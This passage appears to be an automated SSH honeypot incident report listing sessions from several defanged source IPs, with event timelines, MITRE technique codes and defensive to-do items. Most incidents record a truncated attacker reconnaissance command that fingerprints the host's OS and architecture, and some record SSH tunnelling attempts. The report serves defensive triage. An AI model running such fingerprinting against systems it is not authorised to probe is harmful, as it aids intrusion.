| `2026-07-17 03:28:19` | `cowrie.command.success` |
| `2026-07-17 03:28:19` | `cowrie.command.input` |
| `2026-07-17 03:28:19` | `cowrie.command.input` |
| `2026-07-17 03:28:19` | `cowrie.command.input` |
| `2026-07-17 03:28:19` | `cowrie.command.input` |
| `2026-07-17 03:28:19` | `cowrie.log.closed` |
| `2026-07-17 03:28:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0df5db03efac

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 03:30 |
| **Last Seen** | 2026-07-17 03:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:30:13` | `cowrie.session.connect` |
| `2026-07-17 03:30:14` | `cowrie.client.version` |
| `2026-07-17 03:30:14` | `cowrie.client.kex` |
| `2026-07-17 03:30:15` | `cowrie.login.success` |
| `2026-07-17 03:30:16` | `cowrie.session.params` |
| `2026-07-17 03:30:16` | `cowrie.command.input` |
| `2026-07-17 03:30:16` | `cowrie.command.input` |
| `2026-07-17 03:30:16` | `cowrie.command.input` |
| `2026-07-17 03:30:16` | `cowrie.command.input` |
| `2026-07-17 03:30:16` | `cowrie.command.input` |
| `2026-07-17 03:30:16` | `cowrie.command.success` |
| `2026-07-17 03:30:16` | `cowrie.command.input` |
| `2026-07-17 03:30:16` | `cowrie.command.input` |
| `2026-07-17 03:30:16` | `cowrie.command.input` |
| `2026-07-17 03:30:16` | `cowrie.command.input` |
| `2026-07-17 03:30:17` | `cowrie.log.closed` |
| `2026-07-17 03:30:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35fc1143f87e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 03:31 |
| **Last Seen** | 2026-07-17 03:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:31:53` | `cowrie.session.connect` |
| `2026-07-17 03:31:54` | `cowrie.client.version` |
| `2026-07-17 03:31:54` | `cowrie.client.kex` |
| `2026-07-17 03:31:55` | `cowrie.login.success` |
| `2026-07-17 03:31:56` | `cowrie.session.params` |
| `2026-07-17 03:31:56` | `cowrie.command.input` |
| `2026-07-17 03:31:56` | `cowrie.command.input` |
| `2026-07-17 03:31:56` | `cowrie.command.input` |
| `2026-07-17 03:31:56` | `cowrie.command.input` |
| `2026-07-17 03:31:56` | `cowrie.command.input` |
| `2026-07-17 03:31:56` | `cowrie.command.success` |
| `2026-07-17 03:31:56` | `cowrie.command.input` |
| `2026-07-17 03:31:56` | `cowrie.command.input` |
| `2026-07-17 03:31:56` | `cowrie.command.input` |
| `2026-07-17 03:31:56` | `cowrie.command.input` |
| `2026-07-17 03:31:57` | `cowrie.log.closed` |
| `2026-07-17 03:31:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4db713fc2c26

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 03:33 |
| **Last Seen** | 2026-07-17 03:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:33:37` | `cowrie.session.connect` |
| `2026-07-17 03:33:37` | `cowrie.client.version` |
| `2026-07-17 03:33:37` | `cowrie.client.kex` |
| `2026-07-17 03:33:38` | `cowrie.login.success` |
| `2026-07-17 03:33:39` | `cowrie.session.params` |
| `2026-07-17 03:33:39` | `cowrie.command.input` |
| `2026-07-17 03:33:39` | `cowrie.command.input` |
| `2026-07-17 03:33:39` | `cowrie.command.input` |
| `2026-07-17 03:33:39` | `cowrie.command.input` |
| `2026-07-17 03:33:39` | `cowrie.command.input` |
| `2026-07-17 03:33:39` | `cowrie.command.success` |
| `2026-07-17 03:33:39` | `cowrie.command.input` |
| `2026-07-17 03:33:39` | `cowrie.command.input` |
| `2026-07-17 03:33:39` | `cowrie.command.input` |
| `2026-07-17 03:33:39` | `cowrie.command.input` |
| `2026-07-17 03:33:39` | `cowrie.log.closed` |
| `2026-07-17 03:33:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9c27044f35a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 03:35 |
| **Last Seen** | 2026-07-17 03:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:35:37` | `cowrie.session.connect` |
| `2026-07-17 03:35:37` | `cowrie.client.version` |
| `2026-07-17 03:35:37` | `cowrie.client.kex` |
| `2026-07-17 03:35:38` | `cowrie.login.success` |
| `2026-07-17 03:35:39` | `cowrie.session.params` |
| `2026-07-17 03:35:39` | `cowrie.command.input` |
| `2026-07-17 03:35:39` | `cowrie.command.input` |
| `2026-07-17 03:35:39` | `cowrie.command.input` |
| `2026-07-17 03:35:39` | `cowrie.command.input` |
| `2026-07-17 03:35:39` | `cowrie.command.input` |
| `2026-07-17 03:35:39` | `cowrie.command.success` |
| `2026-07-17 03:35:39` | `cowrie.command.input` |
| `2026-07-17 03:35:39` | `cowrie.command.input` |
| `2026-07-17 03:35:39` | `cowrie.command.input` |
| `2026-07-17 03:35:39` | `cowrie.command.input` |
| `2026-07-17 03:35:39` | `cowrie.log.closed` |
| `2026-07-17 03:35:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-580921e5df35

| Field | Detail |
|---|---|
| **Source IP** | `34.76.4[.]158` |
| **First Seen** | 2026-07-17 03:37 |
| **Last Seen** | 2026-07-17 03:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:37:20` | `cowrie.session.connect` |
| `2026-07-17 03:37:20` | `cowrie.login.success` |
| `2026-07-17 03:37:20` | `cowrie.session.params` |
| `2026-07-17 03:37:20` | `cowrie.command.input` |
| `2026-07-17 03:37:20` | `cowrie.command.input` |
| `2026-07-17 03:37:20` | `cowrie.command.failed` |
| `2026-07-17 03:37:20` | `cowrie.command.input` |
| `2026-07-17 03:37:20` | `cowrie.log.closed` |
| `2026-07-17 03:37:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.76.4[.]158` to AbuseIPDB if not already reported
- [ ] Block `34.76.4[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-818c0e05988e

| Field | Detail |
|---|---|
| **Source IP** | `34.76.4[.]158` |
| **First Seen** | 2026-07-17 03:37 |
| **Last Seen** | 2026-07-17 03:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:37:33` | `cowrie.session.connect` |
| `2026-07-17 03:37:33` | `cowrie.login.success` |
| `2026-07-17 03:37:34` | `cowrie.session.params` |
| `2026-07-17 03:37:34` | `cowrie.command.input` |
| `2026-07-17 03:37:34` | `cowrie.command.failed` |
| `2026-07-17 03:37:36` | `cowrie.log.closed` |
| `2026-07-17 03:37:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.76.4[.]158` to AbuseIPDB if not already reported
- [ ] Block `34.76.4[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c981fb2e37b

| Field | Detail |
|---|---|
| **Source IP** | `34.76.4[.]158` |
| **First Seen** | 2026-07-17 03:37 |
| **Last Seen** | 2026-07-17 03:37 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:37:35` | `cowrie.session.connect` |
| `2026-07-17 03:37:35` | `cowrie.login.success` |
| `2026-07-17 03:37:36` | `cowrie.session.params` |
| `2026-07-17 03:37:36` | `cowrie.command.input` |
| `2026-07-17 03:37:54` | `cowrie.log.closed` |
| `2026-07-17 03:37:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.76.4[.]158` to AbuseIPDB if not already reported
- [ ] Block `34.76.4[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-848b2e725bf3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 03:37 |
| **Last Seen** | 2026-07-17 03:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:37:43` | `cowrie.session.connect` |
| `2026-07-17 03:37:43` | `cowrie.client.version` |
| `2026-07-17 03:37:44` | `cowrie.client.kex` |
| `2026-07-17 03:37:44` | `cowrie.login.success` |
| `2026-07-17 03:37:45` | `cowrie.session.params` |
| `2026-07-17 03:37:45` | `cowrie.command.input` |
| `2026-07-17 03:37:45` | `cowrie.command.input` |
| `2026-07-17 03:37:45` | `cowrie.command.input` |
| `2026-07-17 03:37:45` | `cowrie.command.input` |
| `2026-07-17 03:37:45` | `cowrie.command.input` |
| `2026-07-17 03:37:45` | `cowrie.command.success` |
| `2026-07-17 03:37:45` | `cowrie.command.input` |
| `2026-07-17 03:37:45` | `cowrie.command.input` |
| `2026-07-17 03:37:45` | `cowrie.command.input` |
| `2026-07-17 03:37:45` | `cowrie.command.input` |
| `2026-07-17 03:37:46` | `cowrie.log.closed` |
| `2026-07-17 03:37:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1eac9d436f4

| Field | Detail |
|---|---|
| **Source IP** | `45.167.250[.]45` |
| **First Seen** | 2026-07-17 03:38 |
| **Last Seen** | 2026-07-17 03:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:38:48` | `cowrie.session.connect` |
| `2026-07-17 03:38:48` | `cowrie.client.version` |
| `2026-07-17 03:38:48` | `cowrie.client.kex` |
| `2026-07-17 03:38:50` | `cowrie.login.success` |
| `2026-07-17 03:38:50` | `cowrie.direct-tcpip.request` |
| `2026-07-17 03:38:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.167.250[.]45` to AbuseIPDB if not already reported
- [ ] Block `45.167.250[.]45` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1234eb192655

| Field | Detail |
|---|---|
| **Source IP** | `124.67.120[.]106` |
| **First Seen** | 2026-07-17 03:38 |
| **Last Seen** | 2026-07-17 03:39 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:38:55` | `cowrie.session.connect` |
| `2026-07-17 03:38:56` | `cowrie.client.version` |
| `2026-07-17 03:38:56` | `cowrie.client.kex` |
| `2026-07-17 03:39:00` | `cowrie.login.success` |
| `2026-07-17 03:39:01` | `cowrie.direct-tcpip.request` |
| `2026-07-17 03:39:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.67.120[.]106` to AbuseIPDB if not already reported
- [ ] Block `124.67.120[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ae2470107fe

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 03:39 |
| **Last Seen** | 2026-07-17 03:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:39:31` | `cowrie.session.connect` |
| `2026-07-17 03:39:32` | `cowrie.client.version` |
| `2026-07-17 03:39:32` | `cowrie.client.kex` |
| `2026-07-17 03:39:33` | `cowrie.login.success` |
| `2026-07-17 03:39:34` | `cowrie.session.params` |
| `2026-07-17 03:39:34` | `cowrie.command.input` |
| `2026-07-17 03:39:34` | `cowrie.command.input` |
| `2026-07-17 03:39:34` | `cowrie.command.input` |
| `2026-07-17 03:39:34` | `cowrie.command.input` |
| `2026-07-17 03:39:34` | `cowrie.command.input` |
| `2026-07-17 03:39:34` | `cowrie.command.success` |
| `2026-07-17 03:39:34` | `cowrie.command.input` |
| `2026-07-17 03:39:34` | `cowrie.command.input` |
| `2026-07-17 03:39:34` | `cowrie.command.input` |
| `2026-07-17 03:39:34` | `cowrie.command.input` |
| `2026-07-17 03:39:34` | `cowrie.log.closed` |
| `2026-07-17 03:39:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5320bb43d7c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 03:41 |
| **Last Seen** | 2026-07-17 03:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:41:24` | `cowrie.session.connect` |
| `2026-07-17 03:41:24` | `cowrie.client.version` |
| `2026-07-17 03:41:24` | `cowrie.client.kex` |
| `2026-07-17 03:41:25` | `cowrie.login.success` |
| `2026-07-17 03:41:27` | `cowrie.session.params` |
| `2026-07-17 03:41:27` | `cowrie.command.input` |
| `2026-07-17 03:41:27` | `cowrie.command.input` |
| `2026-07-17 03:41:27` | `cowrie.command.input` |
| `2026-07-17 03:41:27` | `cowrie.command.input` |
| `2026-07-17 03:41:27` | `cowrie.command.input` |
| `2026-07-17 03:41:27` | `cowrie.command.success` |
| `2026-07-17 03:41:27` | `cowrie.command.input` |
| `2026-07-17 03:41:27` | `cowrie.command.input` |
| `2026-07-17 03:41:27` | `cowrie.command.input` |
| `2026-07-17 03:41:27` | `cowrie.command.input` |
| `2026-07-17 03:41:27` | `cowrie.log.closed` |
| `2026-07-17 03:41:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea41de669f6f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 03:43 |
| **Last Seen** | 2026-07-17 03:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:43:13` | `cowrie.session.connect` |
| `2026-07-17 03:43:13` | `cowrie.client.version` |
| `2026-07-17 03:43:13` | `cowrie.client.kex` |
| `2026-07-17 03:43:14` | `cowrie.login.success` |
| `2026-07-17 03:43:15` | `cowrie.session.params` |
| `2026-07-17 03:43:15` | `cowrie.command.input` |
| `2026-07-17 03:43:15` | `cowrie.command.input` |
| `2026-07-17 03:43:15` | `cowrie.command.input` |
| `2026-07-17 03:43:15` | `cowrie.command.input` |
| `2026-07-17 03:43:15` | `cowrie.command.input` |
| `2026-07-17 03:43:15` | `cowrie.command.success` |
| `2026-07-17 03:43:15` | `cowrie.command.input` |
| `2026-07-17 03:43:15` | `cowrie.command.input` |
| `2026-07-17 03:43:15` | `cowrie.command.input` |
| `2026-07-17 03:43:15` | `cowrie.command.input` |
| `2026-07-17 03:43:16` | `cowrie.log.closed` |
| `2026-07-17 03:43:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-718cc8e94d55

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 03:45 |
| **Last Seen** | 2026-07-17 03:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:45:00` | `cowrie.session.connect` |
| `2026-07-17 03:45:00` | `cowrie.client.version` |
| `2026-07-17 03:45:00` | `cowrie.client.kex` |
| `2026-07-17 03:45:01` | `cowrie.login.success` |
| `2026-07-17 03:45:02` | `cowrie.session.params` |
| `2026-07-17 03:45:02` | `cowrie.command.input` |
| `2026-07-17 03:45:02` | `cowrie.command.input` |
| `2026-07-17 03:45:02` | `cowrie.command.input` |
| `2026-07-17 03:45:02` | `cowrie.command.input` |
| `2026-07-17 03:45:02` | `cowrie.command.input` |
| `2026-07-17 03:45:02` | `cowrie.command.success` |
| `2026-07-17 03:45:02` | `cowrie.command.input` |
| `2026-07-17 03:45:02` | `cowrie.command.input` |
| `2026-07-17 03:45:02` | `cowrie.command.input` |
| `2026-07-17 03:45:02` | `cowrie.command.input` |
| `2026-07-17 03:45:02` | `cowrie.log.closed` |
| `2026-07-17 03:45:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72233714f76c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 03:46 |
| **Last Seen** | 2026-07-17 03:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
